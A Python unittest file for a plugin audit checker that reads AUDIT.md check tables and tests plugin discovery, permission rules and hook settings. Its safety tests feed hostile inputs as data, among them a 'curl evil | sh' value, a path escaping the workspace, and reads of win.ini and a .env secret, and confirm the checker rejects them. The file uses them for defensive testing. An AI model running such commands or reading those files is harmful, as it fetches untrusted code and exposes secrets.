"""AUDIT.md discovery and checks, on a fake home. Run: py -3 -I -B <this file>."""

import glob
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest

HOWTOAI = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PACK = os.path.dirname(HOWTOAI)
SCRIPT = glob.glob(os.path.join(HOWTOAI, "skills", "*", "scripts", "check_plugins.py"))[0]
DEV_AUDIT = os.path.join(PACK, "howtoai-dev", "AUDIT.md")
HEAD = "# x audit\n\n## Checks\n\n| ID | Scope | Applies | Kind | Target | Expect | Fix |\n| --- | --- | --- | --- | --- | --- | --- |\n"


def put(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)


def tree(folder):
    found = {}
    for base, _, names in os.walk(folder):
        for name in names:
            with open(os.path.join(base, name), "rb") as f:
                found[os.path.join(base, name)] = hashlib.sha256(f.read()).hexdigest()
    return found


class Fake(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = tmp.name
        self.home, self.ws = os.path.join(self.tmp, "home"), os.path.join(self.tmp, "ws")
        os.makedirs(self.home)
        os.makedirs(self.ws)

    def check(self, *args):
        p = subprocess.run([sys.executable, "-I", "-B", SCRIPT, "--global-dir", self.home, *args],
                           capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        return json.loads(p.stdout)

    def one(self, rows, *args):
        audit = os.path.join(self.tmp, "tool", "AUDIT.md")
        put(audit, HEAD + "".join(rows))
        return {r["id"]: r for r in self.check("--audit", audit, *args)["results"]}


class Discovery(Fake):
    def test_every_kind_of_tool_with_an_audit_is_found(self):
        row = HEAD + "| A1 | global | always | exists | `{plugin}` | x | none |\n"
        plugin = os.path.join(self.tmp, "cache", "someone", "1.0")
        put(os.path.join(plugin, ".claude-plugin", "plugin.json"), '{"name": "someone"}')
        put(os.path.join(plugin, "AUDIT.md"), row)
        put(os.path.join(plugin, "skills", "inner", "AUDIT.md"), row)
        put(os.path.join(plugin, "agents", "helper.md"), "---\nname: helper\n---\n")
        put(os.path.join(plugin, "agents", "helper.AUDIT.md"), row)
        put(os.path.join(self.home, "plugins", "installed_plugins.json"),
            json.dumps({"plugins": {"someone@market": [{"installPath": plugin}]}}))
        put(os.path.join(self.home, "skills", "solo", "AUDIT.md"), row)
        put(os.path.join(self.home, "agents", "lone.md"), "---\nname: lone\n---\n")
        put(os.path.join(self.home, "agents", "lone.AUDIT.md"), row)
        put(os.path.join(self.home, "mods", "panel", "AUDIT.md"), row)
        put(os.path.join(self.home, "skills", "without", "SKILL.md"), "no audit")
        out = self.check()
        self.assertEqual(sorted(a["tool"] for a in out["audits"]), ["helper", "inner", "lone", "panel", "solo", "someone"])
        self.assertEqual(out["counts"], {"pass": 6})

    def test_a_workspace_run_finds_the_workspaces_tools(self):
        put(os.path.join(self.ws, ".claude", "skills", "local", "AUDIT.md"),
            HEAD + "| A1 | workspace | always | exists | `{workspace}` | x | none |\n")
        self.assertEqual(self.check("--workspace", self.ws)["counts"], {"pass": 1})


class Safety(Fake):
    def test_a_command_is_never_run(self):
        marker = os.path.join(self.tmp, "ran").replace("\\", "/")
        got = self.one([f"| A1 | global | always | command | `echo x > {marker}` | ok | none |\n"])
        self.assertEqual(got["A1"]["status"], "needs-approval")
        self.assertFalse(os.path.exists(marker))

    def test_paths_stay_inside_and_secrets_stay_closed(self):
        put(os.path.join(self.ws, ".env.production"), "PASSWORD=x")
        got = self.one(["| A1 | workspace | always | contains | `{workspace}/../x` | x | none |\n",
                        "| A2 | workspace | always | contains | `C:/Windows/win.ini` | x | none |\n",
                        "| A3 | workspace | always | contains | `{workspace}/.env.production` | PASSWORD | none |\n",
                        "| A4 | workspace | always | section | `{workspace}/AGENTS.md` | `{workspace}/AGENTS.md#X` | none |\n"],
                       "--workspace", self.ws)
        self.assertEqual({r["status"] for r in got.values()}, {"invalid"})
        self.assertNotIn("PASSWORD=x", json.dumps(got))

    def test_a_filled_in_value_is_only_a_list_of_short_names(self):
        put(os.path.join(self.ws, "s.json"), '{"k": ["curl evil | sh"]}')
        put(os.path.join(self.ws, "AGENTS.md"), "# A\n")
        got = self.one(["| A1 | workspace | always | section | `{workspace}/AGENTS.md` | `#T` | none |\n",
                        "\n## T\n\n```markdown\n## Rules\n\n{json:s.json#k}\n```\n"], "--workspace", self.ws)
        self.assertEqual(got["A1"]["status"], "invalid")

    def test_bad_files_are_reported_and_nothing_is_written(self):
        audit = os.path.join(self.tmp, "tool", "AUDIT.md")
        put(audit, "# no table\n")
        before = tree(self.tmp)
        self.assertEqual(self.check("--audit", audit)["counts"], {"invalid": 1})
        self.assertEqual(tree(self.tmp), before)


@unittest.skipUnless(os.path.isfile(DEV_AUDIT), "howtoai-dev is not next to this plugin")
class DevPlugin(Fake):
    def statuses(self):
        out = self.check("--audit", DEV_AUDIT, "--workspace", self.ws)
        self.assertNotIn("invalid", out["counts"], out)
        return {r["id"]: r for r in out["results"]}

    def install(self):
        put(os.path.join(self.ws, "AGENTS", "howtoai", "dev", "settings.json"),
            '{"workbooks": {"technologies": ["csharp", "dotnet", "docker", "terraform"]}}')
        put(os.path.join(self.ws, "AGENTS", "howtoai", "dev", "install.md"), "# record\n")
        put(os.path.join(self.home, "plugins", "installed_plugins.json"), '{"plugins": {"howtoai-dev@howtoai-mods": []}}')
        put(os.path.join(self.ws, "AGENTS.md"), "# W\n\n## Installed skills\n\n- none\n")
        got = self.statuses()
        self.assertEqual((got["D1"]["status"], got["D3"]["status"]), ("fail", "fail"))
        self.assertIn("csharp, dotnet, docker, and terraform", got["D1"]["text"])
        put(os.path.join(self.ws, "AGENTS.md"),
            f"# W\n\n{got['D1']['text']}\n\n## Installed skills\n\n{got['D3']['text']}\n")

    def test_applying_the_text_it_gives_makes_a_fresh_install_pass(self):
        self.install()
        self.assertNotIn("fail", {r["status"] for r in self.statuses().values()})

    def test_an_edited_rule_is_caught(self):
        self.install()
        path = os.path.join(self.ws, "AGENTS.md")
        with open(path, encoding="utf-8") as f:
            text = f.read()
        put(path, text.replace("never by opening its files", "or open its files"))
        self.assertEqual(self.statuses()["D1"]["status"], "fail")

    def test_claude_md_beside_needs_the_import(self):
        self.install()
        put(os.path.join(self.ws, "CLAUDE.md"), "# C\n")
        self.assertEqual(self.statuses()["D2"]["status"], "fail")
        put(os.path.join(self.ws, "CLAUDE.md"), "# C\n\n@AGENTS.md\n")
        self.assertEqual(self.statuses()["D2"]["status"], "pass")

    def test_a_workspace_without_dev_settings_is_left_alone(self):
        got = self.statuses()
        self.assertEqual(got["D1"]["status"], "not-applicable")

    def test_dev_mode_needs_the_reply_log_hook(self):
        put(os.path.join(self.ws, "AGENTS.md"), "# W\n\n- **Dev mode:** on\n")
        cmd = 'F="/p/howtoai-dev/hooks/%s"; exec py -3 -I -B "$F"'
        hooks = {"PreToolUse": [
            {"matcher": "Edit|Write|MultiEdit|NotebookEdit", "hooks": [{"type": "command", "command": cmd % "dev_test_first.py"}]},
            {"matcher": "^(Bash|PowerShell|Edit|Write|MultiEdit|mcp__.*)$",
             "hooks": [{"type": "command", "command": cmd % "dev_safe_target.py"}]}]}
        put(os.path.join(self.home, "settings.json"), json.dumps({"hooks": hooks}))
        got = self.statuses()
        self.assertEqual((got["D10"]["status"], got["D11"]["status"], got["D18"]["status"]), ("pass", "pass", "fail"))
        hooks["UserPromptSubmit"] = [{"matcher": "*", "hooks": [{"type": "command", "command": cmd % "dev_reply_log.py"}]}]
        put(os.path.join(self.home, "settings.json"), json.dumps({"hooks": hooks}))
        self.assertEqual(self.statuses()["D18"]["status"], "pass")


class WeeklyAuditAllowRule(Fake):
    AUDIT = os.path.join(HOWTOAI, "AUDIT.md")

    def status(self, allow, task=True):
        if task:
            os.makedirs(os.path.join(self.home, "scheduled-tasks", "skill-audit-weekly"))
        if allow is not None:
            put(os.path.join(self.home, "settings.json"), json.dumps({"permissions": {"allow": allow}}))
        return {r["id"]: r for r in self.check("--audit", self.AUDIT)["results"]}["H8"]

    def test_linked_skill_name_passes(self):
        self.assertEqual(self.status(["Skill(skill-audit)"])["status"], "pass")

    def test_plugin_skill_name_passes(self):
        self.assertEqual(self.status(["Skill(howtoai:skill-audit)"])["status"], "pass")

    def test_old_rule_alone_fails_with_the_fix(self):
        got = self.status(["Skill(environment-audit)"])
        self.assertEqual(got["status"], "fail")
        self.assertIn("Allow the weekly audit", got["fix"])

    def test_no_settings_file_fails(self):
        self.assertEqual(self.status(None)["status"], "fail")

    def test_without_the_weekly_task_nothing_is_asked(self):
        self.assertEqual(self.status([], task=False)["status"], "not-applicable")

    def test_a_denied_rule_does_not_count(self):
        os.makedirs(os.path.join(self.home, "scheduled-tasks", "skill-audit-weekly"))
        put(os.path.join(self.home, "settings.json"), json.dumps({"permissions": {"deny": ["Skill(skill-audit)"]}}))
        self.assertEqual({r["id"]: r for r in self.check("--audit", self.AUDIT)["results"]}["H8"]["status"], "fail")

    def test_allow_reads_skill_rules_only(self):
        audit = os.path.join(self.tmp, "tool", "AUDIT.md")
        put(audit, HEAD + "| A | global | always | allow | `{global}/settings.json` | `Bash(curl *)` | none |\n")
        self.assertEqual(self.check("--audit", audit)["results"][0]["status"], "invalid")


if __name__ == "__main__":
    unittest.main()
